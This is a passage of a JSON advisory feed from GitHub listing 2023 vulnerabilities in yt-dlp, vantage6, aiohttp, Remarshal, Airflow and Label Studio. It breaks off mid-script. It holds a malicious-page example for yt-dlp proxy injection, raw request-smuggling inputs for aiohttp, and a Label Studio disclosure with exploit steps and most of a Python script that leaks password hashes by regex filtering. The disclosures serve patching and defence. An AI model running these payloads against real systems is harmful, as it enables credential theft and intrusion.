            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Generic Extractor in yt-dlp is vulnerable to an attacker setting an arbitrary proxy for a request to an arbitrary url, allowing the attacker to MITM the request made from yt-dlp's HTTP session. This could lead to cookie exfiltration in some cases.</p>\n<details>\n\n<p>To pass extra control data between extractors (such as headers like <code>Referer</code>), yt-dlp employs a concept of \"url smuggling\". This works by adding this extra data as json to the url fragment (\"smuggling\") that is then passed on to an extractor. The receiving extractor then \"unsmuggles\" the data from the input url. This functionality is intended to be internal only.</p>\n<p>Currently, the Generic extractor supports receiving an arbitrary dictionary of HTTP headers in a smuggled url, of which it extracts and adds them to the initial request it makes to such url. This is useful when a url sent to the Generic extractor needs a <code>Referer</code> header sent with it, for example.</p>\n<p>Additionally, yt-dlp has internal headers to set a proxy for a request: <code>Ytdl-request-proxy</code> and <code>Ytdl-socks-proxy</code>. While these are deprecated, internally <code>Ytdl-request-proxy</code> is still used for <code>--geo-verification-proxy</code>.</p>\n<p>However, it is possible for a maliciously crafted site include these smuggled options in a url which then the Generic extractor extracts and redirects to itself.  This allows a malicious website to <strong>set an arbitrary proxy for an arbitrary url that the Generic extractor will request.</strong></p>\n<p>This could allow for the following, but not limited too:</p>\n<ul>\n<li>An attacker can MITM a request it asks yt-dlp to make to <strong>any</strong> website.<ul>\n<li>If a user has loaded cookies into yt-dlp for the target site, which are not marked as <a href=\"https://en.wikipedia.org/wiki/Secure_cookie\">secure</a>, they could be exfiltrated by the attacker.</li>\n<li>Fortunately most sites are HTTPS and should be setting cookies as secure.</li>\n</ul>\n</li>\n<li>An attacker can set cookies for an arbitrary site.</li>\n</ul>\n<p>An example malicious webpage:</p>\n<pre><code class=\"language-html\">&lt;!DOCTYPE html&gt;\n&lt;cinerama.embedPlayer('t','{{ target_site }}#__youtubedl_smuggle=%7B%22http_headers%22:%7B%22Ytdl-request-proxy%22:%22{{ proxy url }}%22%7D,%22fake%22:%22.smil/manifest%22%7D')\n</code></pre>\n<p>Where <code>{{ target_site }}</code> is the URL Generic extractor will request and <code>{{ proxy url }}</code> is the proxy to proxy the request for this url through.</p>\n</details>\n\n<h3 id=\"patches\">Patches</h3>\n<ul>\n<li>We have removed the ability to smuggle <code>http_headers</code> to the Generic extractor, as well as other extractors that use the same pattern.</li>\n</ul>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Disable Generic extractor (<code>--ies default,-generic</code>), or only pass trusted sites with trusted content.</li>\n<li>Take caution when using <code>--no-check-certificate</code>.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x\">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-46121\">https://nvd.nist.gov/vuln/detail/CVE-2023-46121</a></li>\n<li><a href=\"https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14\">https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14</a></li>\n<li><a href=\"https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb\">https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x\">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-46121\">https://nvd.nist.gov/vuln/detail/CVE-2023-46121</a></li>\n<li><a href=\"https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb\">https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb</a></li>\n<li><a href=\"https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14\">https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3ch3-jhc6-5r8x\">https://github.com/advisories/GHSA-3ch3-jhc6-5r8x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3ch3-jhc6-5r8x",
            "title": "[yt-dlp] yt-dlp Generic Extractor MITM Vulnerability via Arbitrary Proxy Injection",
            "date_modified": "2023-11-15T14:48:25.000Z",
            "date_published": "2023-11-15T14:48:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3ch3-jhc6-5r8x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A node does not check if an image is allowed to run if a <code>parent_id</code> is set. A malicious party that breaches the server may modify it to set a fake <code>parent_id</code> and send a task of a non-whitelisted algorithm. The node will then execute it because the <code>parent_id</code> that is set prevents checks from being run. Relevant node code <a href=\"https://github.com/vantage6/vantage6/blob/version/4.1.1/vantage6-node/vantage6/node/docker/docker_manager.py#L265-L268\">here</a></p>\n<p>This impacts all servers that are breached by an expert user</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in v4.1.2</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vantage6/vantage6/security/advisories/GHSA-vc3v-ppc7-v486\">https://github.com/vantage6/vantage6/security/advisories/GHSA-vc3v-ppc7-v486</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47631\">https://nvd.nist.gov/vuln/detail/CVE-2023-47631</a></li>\n<li><a href=\"https://github.com/vantage6/vantage6/commit/bf83521eb12fa80aa5fc92ef1692010a9a7f8243\">https://github.com/vantage6/vantage6/commit/bf83521eb12fa80aa5fc92ef1692010a9a7f8243</a></li>\n<li><a href=\"https://github.com/vantage6/vantage6/blob/version/4.1.1/vantage6-node/vantage6/node/docker/docker_manager.py#L265-L268\">https://github.com/vantage6/vantage6/blob/version/4.1.1/vantage6-node/vantage6/node/docker/docker_manager.py#L265-L268</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vc3v-ppc7-v486\">https://github.com/advisories/GHSA-vc3v-ppc7-v486</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vc3v-ppc7-v486",
            "title": "[vantage6-server] vantage6-server node accepts non-whitelisted algorithms from malicious server",
            "date_modified": "2023-11-14T22:21:58.000Z",
            "date_published": "2023-11-14T22:21:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vc3v-ppc7-v486"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"summary\">Summary</h1>\n<p>The HTTP parser in AIOHTTP has numerous problems with header parsing, which could lead to request smuggling.\nThis parser is only used when <code>AIOHTTP_NO_EXTENSIONS</code> is enabled (or not using a prebuilt wheel).</p>\n<h1 id=\"details\">Details</h1>\n<h2 id=\"bug-1-bad-parsing-of-content-length-values\">Bug 1: Bad parsing of <code>Content-Length</code> values</h2>\n<h3 id=\"description\">Description</h3>\n<p>RFC 9110 says this:</p>\n<blockquote>\n<p><code>Content-Length = 1*DIGIT</code></p>\n</blockquote>\n<p>AIOHTTP does not enforce this rule, presumably because of an incorrect usage of the builtin <code>int</code> constructor. Because the <code>int</code> constructor accepts <code>+</code> and <code>-</code> prefixes, and digit-separating underscores, using <code>int</code> to parse CL values leads AIOHTTP to significant misinterpretation.</p>\n<h3 id=\"examples\">Examples</h3>\n<pre><code>GET / HTTP/1.1\\r\\n\nContent-Length: -0\\r\\n\n\\r\\n\nX\n</code></pre>\n<pre><code>GET / HTTP/1.1\\r\\n\nContent-Length: +0_1\\r\\n\n\\r\\n\nX\n</code></pre>\n<h3 id=\"suggested-action\">Suggested action</h3>\n<p>Verify that a <code>Content-Length</code> value consists only of ASCII digits before parsing, as the standard requires.</p>\n<h2 id=\"bug-2-improper-handling-of-nul-cr-and-lf-in-header-values\">Bug 2: Improper handling of NUL, CR, and LF in header values</h2>\n<h3 id=\"description-1\">Description</h3>\n<p>RFC 9110 says this:</p>\n<blockquote>\n<p>Field values containing CR, LF, or NUL characters are invalid and dangerous, due to the varying ways that implementations might parse and interpret those characters; a recipient of CR, LF, or NUL within a field value MUST either reject the message or replace each of those characters with SP before further processing or forwarding of that message.</p>\n</blockquote>\n<p>AIOHTTP's HTTP parser does not enforce this rule, and will happily process header values containing these three forbidden characters without replacing them with SP.</p>\n<h3 id=\"examples-1\">Examples</h3>\n<pre><code>GET / HTTP/1.1\\r\\n\nHeader: v\\x00alue\\r\\n\n\\r\\n\n</code></pre>\n<pre><code>GET / HTTP/1.1\\r\\n\nHeader: v\\ralue\\r\\n\n\\r\\n\n</code></pre>\n<pre><code>GET / HTTP/1.1\\r\\n\nHeader: v\\nalue\\r\\n\n\\r\\n\n</code></pre>\n<h3 id=\"suggested-action-1\">Suggested action</h3>\n<p>Reject all messages with NUL, CR, or LF in a header value. The translation to space thing, while technically allowed, does not seem like a good idea to me.</p>\n<h2 id=\"bug-3-improper-stripping-of-whitespace-before-colon-in-http-headers\">Bug 3: Improper stripping of whitespace before colon in HTTP headers</h2>\n<h3 id=\"description-2\">Description</h3>\n<p>RFC 9112 says this:</p>\n<blockquote>\n<p>No whitespace is allowed between the field name and colon. In the past, differences in the handling of such whitespace have led to security vulnerabilities in request routing and response handling. A server MUST reject, with a response status code of 400 (Bad Request), any received request message that contains whitespace between a header field name and colon.</p>\n</blockquote>\n<p>AIOHTTP does not enforce this rule, and will simply strip any whitespace before the colon in an HTTP header.</p>\n<h3 id=\"example\">Example</h3>\n<pre><code>GET / HTTP/1.1\\r\\n\nContent-Length : 1\\r\\n\n\\r\\n\nX\n</code></pre>\n<h3 id=\"suggested-action-2\">Suggested action</h3>\n<p>Reject all messages with whitespace before a colon in a header field, as the standard requires.</p>\n<h1 id=\"poc\">PoC</h1>\n<p>Example requests are embedded in the previous section. To reproduce these bugs, start an AIOHTTP server without llhttp (i.e. <code>AIOHTTP_NO_EXTENSIONS=1</code>) and send the requests given in the previous section. (e.g. by <code>printf</code>ing into <code>nc</code>)</p>\n<h1 id=\"impact\">Impact</h1>\n<p>Each of these bugs can be used for request smuggling.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg\">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-gfw2-4jvh-wgfg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47627\">https://nvd.nist.gov/vuln/detail/CVE-2023-47627</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/commit/d5c12ba890557a575c313bb3017910d7616fce3d\">https://github.com/aio-libs/aiohttp/commit/d5c12ba890557a575c313bb3017910d7616fce3d</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/releases/tag/v3.8.6\">https://github.com/aio-libs/aiohttp/releases/tag/v3.8.6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gfw2-4jvh-wgfg\">https://github.com/advisories/GHSA-gfw2-4jvh-wgfg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gfw2-4jvh-wgfg",
            "title": "[aiohttp] AIOHTTP has problems in HTTP parser (the python one, not llhttp)",
            "date_modified": "2023-11-14T22:21:00.000Z",
            "date_published": "2023-11-14T22:20:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gfw2-4jvh-wgfg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Remarshal prior to v0.17.1 expands YAML alias nodes unlimitedly, hence Remarshal is vulnerable to Billion Laughs Attack. Processing untrusted YAML files may cause a denial-of-service (DoS) condition.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47163\">https://nvd.nist.gov/vuln/detail/CVE-2023-47163</a></li>\n<li><a href=\"https://github.com/remarshal-project/remarshal/commit/fd6ac799a02f533c3fc243b49cdd6d21aa7ee494\">https://github.com/remarshal-project/remarshal/commit/fd6ac799a02f533c3fc243b49cdd6d21aa7ee494</a></li>\n<li><a href=\"https://github.com/remarshal-project/remarshal/releases/tag/v0.17.1\">https://github.com/remarshal-project/remarshal/releases/tag/v0.17.1</a></li>\n<li><a href=\"https://jvn.jp/en/jp/JVN86156389/\">https://jvn.jp/en/jp/JVN86156389/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gw7g-qr8w-3448\">https://github.com/advisories/GHSA-gw7g-qr8w-3448</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gw7g-qr8w-3448",
            "title": "[remarshal] Remarshal expands YAML alias nodes unlimitedly, hence Remarshal is vulnerable to Billion Laughs Attack",
            "date_modified": "2023-11-14T22:19:06.000Z",
            "date_published": "2023-11-13T03:30:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gw7g-qr8w-3448"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Aiohttp has a security vulnerability regarding the inconsistent interpretation of the http protocol. As we know that HTTP/1.1 is persistent, if we have both Content-Length(CL) and Transfer-Encoding(TE) it can lead to incorrect interpretation of two entities that parse the HTTP and we can poison other sockets with this incorrect interpretation.</p>\n<p>A possible Proof-of-Concept (POC) would be a configuration with a reverse proxy(frontend) that accepts both CL and TE headers and aiohttp as backend. As aiohttp parses anything with chunked, we can pass a chunked123 as TE, the frontend entity will ignore this header and will parse Content-Length. I can give a Dockerfile with the configuration if you want.</p>\n<p>The impact of this vulnerability is that it is possible to bypass any proxy rule, poisoning sockets to other users like passing Authentication Headers, also if it is present an Open Redirect (just like CVE-2021-21330) we can combine it to redirect random users to our website and log the request.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371\">https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aio-libs/aiohttp/security/advisories/GHSA-xx9p-xxvh-7g8j\">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-xx9p-xxvh-7g8j</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371\">https://github.com/aio-libs/aiohttp/commit/f016f0680e4ace6742b03a70cb0382ce86abe371</a></li>\n<li><a href=\"https://github.com/aio-libs/aiohttp/releases/tag/v3.8.0\">https://github.com/aio-libs/aiohttp/releases/tag/v3.8.0</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47641\">https://nvd.nist.gov/vuln/detail/CVE-2023-47641</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xx9p-xxvh-7g8j\">https://github.com/advisories/GHSA-xx9p-xxvh-7g8j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xx9p-xxvh-7g8j",
            "title": "[aiohttp] Aiohttp has inconsistent interpretation of `Content-Length` vs. `Transfer-Encoding` differing in C and Python fallbacks",
            "date_modified": "2023-11-14T21:37:06.000Z",
            "date_published": "2023-11-14T20:36:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xx9p-xxvh-7g8j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Airflow, versions before 2.7.3, has a vulnerability that allows an authorized user who has access to read specific DAGs only, to read information about task instances in other DAGs.&nbsp; This is a different issue than CVE-2023-42663 but leading to similar outcome.\nUsers of Apache Airflow are advised to upgrade to version 2.7.3 or newer to mitigate the risk associated with this vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-42781\">https://nvd.nist.gov/vuln/detail/CVE-2023-42781</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/34939\">https://github.com/apache/airflow/pull/34939</a></li>\n<li><a href=\"https://lists.apache.org/thread/7dnl8nszdxqyns57f3dw0sloy5dfl9o1\">https://lists.apache.org/thread/7dnl8nszdxqyns57f3dw0sloy5dfl9o1</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2023/11/12/2\">http://www.openwall.com/lists/oss-security/2023/11/12/2</a></li>\n<li><a href=\"https://github.com/apache/airflow/commit/33ec72948f74f56f2adb5e2d388e60e88e8a3fa3\">https://github.com/apache/airflow/commit/33ec72948f74f56f2adb5e2d388e60e88e8a3fa3</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-231.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-231.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r7x6-xfcm-3mxv\">https://github.com/advisories/GHSA-r7x6-xfcm-3mxv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r7x6-xfcm-3mxv",
            "title": "[apache-airflow] Apache Airflow vulnerable to Exposure of Sensitive Information to an Unauthorized Actor",
            "date_modified": "2023-11-14T20:35:48.000Z",
            "date_published": "2023-11-12T15:30:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r7x6-xfcm-3mxv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"introduction\">Introduction</h1>\n<p>This write-up describes a vulnerability found in <a href=\"https://github.com/HumanSignal/label-studio\">Label Studio</a>, a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to <code>1.9.2post0</code> and was tested on version <code>1.8.2</code>.</p>\n<h1 id=\"overview\">Overview</h1>\n<p>In all current versions of <a href=\"https://github.com/HumanSignal/label-studio\">Label Studio</a>, the application allows users to insecurely set filters for filtering tasks. An attacker can construct a <em>filter chain</em> to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.</p>\n<pre><code>filter:tasks:updated_by__active_organization__active_users__password\n</code></pre>\n<p>For consistency, this type of vulnerability will be termed as <strong>ORM Leak</strong> in the rest of this disclosure. </p>\n<p>In addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.</p>\n<h1 id=\"description\">Description</h1>\n<p>The following code snippet from the <code>ViewSetSerializer</code> in <a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115\"><code>label_studio/data_manager/serializers.py</code></a> insecurely creates <code>Filter</code> objects from a JSON <code>POST</code> request to the <code>/api/dm/views/{viewId}</code> API endpoint.</p>\n<pre><code class=\"language-python\">    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n</code></pre>\n<p>These <code>Filter</code> objects are then applied in the <code>TaskQuerySet</code> in <a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473\"><code>label_studio/data_manager/managers.py</code></a>.</p>\n<pre><code class=\"language-python\">class TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) &lt;1&gt;\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n</code></pre>\n<ol>\n<li>User provided filters are insecurely applied here by calling the <code>apply_filters</code> that constructs the Django ORM filter.</li>\n</ol>\n<p>The <code>PreparedTaskManager</code> in <a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655\"><code>label_studio/data_manager/managers.py</code></a> uses the vulnerable <code>TaskQuerySet</code> for building the Django queryset for querying <code>Task</code> objects, as shown in the following code snippet.</p>\n<pre><code class=\"language-python\">class PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): &lt;1&gt;\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) &lt;1&gt;\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n</code></pre>\n<ol>\n<li>Special Django method for the <code>models.Manager</code> class that is used to retrieve the queryset for querying objects of a model.</li>\n<li>Uses the vulnerable <code>TaskQuerySet</code> that was explained above.</li>\n</ol>\n<p>The following code snippet of the <code>Task</code> model in <a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102\"><code>label_studio/tasks/models.py</code></a> shows that the vulnerable <code>PreparedTaskManager</code> is set as a class variable, along with the <code>updated_by</code> relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.</p>\n<pre><code class=\"language-python\"># ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') &lt;1&gt;\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app &lt;2&gt;\n\n    # ...\n</code></pre>\n<ol>\n<li>The entry point of the filter chain to filter by the <code>updated_by__active_organization__active_users__password</code>.</li>\n<li>The vulnerable <code>PreparedTaskManager</code> being set that will be exploited.</li>\n</ol>\n<p>Finally, the <code>TaskListAPI</code> view set in <a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205\"><code>label_studio/tasks/api.py</code></a> with the <code>/api/tasks</code> API endpoint uses the vulnerable <code>PreparedTaskManager</code> to filter <code>Task</code> objects.</p>\n<pre><code class=\"language-python\">    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) &lt;1&gt;\n</code></pre>\n<ol>\n<li>Uses the vulnerable <code>PreparedTaskManager</code> to filter objects.</li>\n</ol>\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n<p>Below are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.</p>\n<ol>\n<li>Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.</li>\n<li>Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.</li>\n<li>Navigate to the task view for the project and add any filter with the <code>Network</code> inspect tab open on the browser. Look for a <code>PATCH</code> request to <code>/api/dm/views/{view_id}?interaction=filter&amp;project={project_id}</code> and save the <code>view_id</code> and <code>project_id</code> for the next step.</li>\n<li>Download the attached proof of concept exploit script named <code>labelstudio_ormleak.py</code>. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the <code>{view_id}</code>, <code>{project_id}</code>, <code>{cookie_str}</code> and <code>{url}</code> with the corresponding values. For further explanation run <code>python3 labelstudio_ormleak.py --help</code>.</li>\n</ol>\n<pre><code class=\"language-bash\">python3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n</code></pre>\n<p>The following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash <code>pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=</code>.</p>\n<p><img alt=\"labelstudio_ormleak_poc\" src=\"https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif\"></p>\n<h1 id=\"impact\">Impact</h1>\n<p>This vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions <code>&lt;=1.8.1</code>, this finding can also be chained with hard coded <code>SECRET_KEY</code> to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.</p>\n<h1 id=\"remediation-advice\">Remediation Advice</h1>\n<ul>\n<li>Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.</li>\n<li>Validate filter values to an allow list before performing any queries.</li>\n</ul>\n<h1 id=\"discovered\">Discovered</h1>\n<ul>\n<li>August 2023, Alex Brown, elttam</li>\n</ul>\n<hr>\n<h1 id=\"labelstudio_ormleakpy-proof-of-concept\"><code>labelstudio_ormleak.py</code> proof of concept</h1>\n<pre><code class=\"language-py\">import argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -&gt; argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -&gt; dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&amp;project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&amp;page_size=1&amp;view={view_id}&amp;interaction=filter&amp;project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -&gt; bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) &gt;= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  